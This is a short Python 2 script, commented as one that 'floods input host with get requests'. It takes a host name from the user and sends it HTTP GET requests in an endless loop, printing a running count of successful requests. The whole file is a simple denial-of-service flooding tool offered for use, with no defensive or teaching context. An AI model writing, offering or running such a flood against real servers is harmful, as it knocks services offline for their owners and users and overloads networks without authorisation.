#!/usr/bin/python
# Floods input host with get requests. Yeee
import requests
import time

host = raw_input("Host: ")
if host.startswith("http://") or host.startswith("https://"):
	print host
else:
	host = "http://{0}".format(host)
	print host

reqnum = 0

while True:
	r = requests.get(host)
	if r.status_code == 200:
		reqnum += 1
		print "{0} requests sent to {1}".format(reqnum, host)
